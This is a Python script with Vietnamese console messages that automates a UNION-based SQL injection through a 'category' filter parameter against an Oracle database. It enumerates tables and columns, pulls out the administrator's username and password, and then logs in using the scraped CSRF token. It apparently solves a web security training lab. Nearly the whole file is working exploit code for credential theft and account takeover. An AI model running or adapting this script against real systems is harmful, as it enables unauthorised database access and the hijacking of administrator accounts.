import requests
from bs4 import BeautifulSoup

url = input("Nhập URL: ").rstrip("/")

union_url = f"{url}/filter?category=Gifts'+UNION+SELECT+TABLE_NAME,+NULL+FROM+all_tables--"
print(f"Thử payload: {union_url}")

response = requests.get(union_url)

if response.status_code == 200:
    soup = BeautifulSoup(response.text, "html.parser")
    table_rows = soup.find_all("tr")

    password_found = None
    for row in table_rows:
        th = row.find("th")
        if th:
            content = th.text.strip()
            if content.startswith("USERS_"):
                tmp = content.split("_", 1)[1]
                break

union_url = f"{url}/filter?category=Gifts'+UNION+SELECT+COLUMN_NAME,+NULL+FROM+all_tab_columns+WHERE+table_name+=+'USERS_{tmp}'--"
print(f"Thử payload: {union_url}")

response = requests.get(union_url)

if response.status_code == 200:
    soup = BeautifulSoup(response.text, "html.parser")
    table_rows = soup.find_all("tr")

    tmp1 = None
    tmp2 = None
    for row in table_rows:
        th = row.find("th")
        if th:
            content = th.text.strip()
            if content.startswith("USERNAME_") and tmp1 is None:
                tmp1 = content.split("_", 1)[1]
            elif content.startswith("PASSWORD_") and tmp2 is None:
                tmp2 = content.split("_", 1)[1]

            if tmp1 is not None and tmp2 is not None:
                break

    if tmp1 is not None and tmp2 is not None:
        union_url = f"{url}/filter?category=Gifts'UNION+SELECT+USERNAME_{tmp1}||':'||PASSWORD_{tmp2},+NULL+FROM+USERS_{tmp}+--"
        print(f"Thử payload: {union_url}")
        response = requests.get(union_url)

if response.status_code == 200:
    soup = BeautifulSoup(response.text, "html.parser")
    table_rows = soup.find_all("tr")

    password = None
    for row in table_rows:
        th = row.find("th")
        if th:
            content = th.text.strip()
            if content.startswith("administrator:"):
                password = content.split(":", 1)[1]
                break


    if password:
        print(f"Tìm thấy password của admin: {password}")
    else:
        print("Không tìm thấy password")
        exit()
else:
    print("Lỗi")
    exit()

login_url = f"{url}/login"
session = requests.Session()
response = session.get(login_url)

soup = BeautifulSoup(response.text, "html.parser")
csrf_token = soup.find("input", {"name": "csrf"})["value"]

data = {
    "csrf": csrf_token,
    "username": "administrator",
    "password": password
}

response = session.post(login_url, data=data)

if "Welcome" in response.text or response.status_code == 200:
    print("Đăng nhập thành công!")
else:
    print("Đăng nhập thất bại.")